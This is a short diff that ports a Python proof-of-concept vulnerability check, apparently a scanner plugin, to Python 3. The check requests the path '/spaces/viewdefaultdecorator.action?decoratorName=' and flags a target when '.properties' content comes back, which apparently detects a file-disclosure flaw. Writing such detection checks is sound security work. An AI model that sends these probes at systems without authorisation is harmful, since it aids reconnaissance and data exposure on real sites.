@@ -27,8 +27,8 @@ def poc(_inp):
         for inp in iterate_path(_inp):
             payloads = ['/spaces/viewdefaultdecorator.action?decoratorName=']
             for each in payloads:
-                if '.properties' in requests.get(url=inp + each).content:
+                if b'.properties' in requests.get(url=inp + each).content:
                     return True
         return False
-    except Exception, e:
+    except Exception as e:
         return False
